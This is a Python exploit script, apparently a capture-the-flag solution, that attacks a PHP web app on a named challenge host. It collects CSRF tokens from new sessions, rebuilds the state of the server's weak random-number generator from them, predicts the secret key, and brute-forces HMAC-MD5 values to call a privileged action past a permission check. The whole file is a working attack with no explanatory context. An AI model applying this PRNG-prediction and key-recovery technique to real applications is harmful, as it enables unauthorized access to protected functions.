#!/usr/bin/env python
import requests
import re
import itertools
import random
import string
import hmac
import hashlib
import sys

rand = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
target = "http://0dac0a717c3cf340e.jie.sangebaimao.com:82/index.php"

def get_csrf_token(res):
    rex = re.search(r'name="CSRF_TOKEN" value="(\w+)"', res.content)
    return rex.group(1)

def str_to_random(lst):
    return [rand.find(s) for s in lst]

def random_to_str(lst):
    return ''.join([rand[i] if 0 <= i < len(rand) else '0' for i in lst])

def calc_key(lst):
    for i in range(len(lst), len(lst) + 6):
        assert(lst[i - 31] != -1)
        assert(lst[i - 3] != -1)
        lst.append((lst[i - 31] + lst[i - 3]) % len(rand))
    return lst[-6:]

def test_token(s, secret):
    res = s.get(target)
    token = get_csrf_token(res)
    res = s.post(target, data={
        "submit": "1",
        "CSRF_TOKEN": token,
        "act": "phpinfo",
        "key": hash_hmac("phpinfo", secret)
    })
    if res.content.find("Permission deny!!") < 0:
        sys.stdout.write("\n")
        print("[cookies ]", s.headers['Cookie'])
        print("[key ]", secret)
        print("[content ]", res.content)
        return True
    else:
        sys.stdout.write(".")
        sys.stdout.flush()
        return False

def hash_hmac(data, key):
    h = hmac.new(key, data, hashlib.md5)
    return h.hexdigest()

def rand_str(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def calc_maybe(lst):
    prd = []
    for i in lst:
        prd.append((i, i+1))
    return itertools.product(*prd)

rand_lst = []
s = requests.session();
s.headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) "
                  "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51"
                  ".0.2704.63 Safari/537.36"
}

for i in range(2):
    s.headers['Cookie'] = "PHPSESSID={};".format(rand_str(12))
    res = s.get(target)
    token = get_csrf_token(res)
    rand_lst += list("\x00" * 6)
    rand_lst += list(token)

#print(rand_lst)
rand_lst = str_to_random(rand_lst)

key_arr = calc_key(rand_lst)
print("[calc key] ", key_arr)

s.headers['Cookie'] = "PHPSESSID={};".format(rand_str(12))
for fkey in calc_maybe(key_arr):
    if test_token(s, random_to_str(fkey)):
        break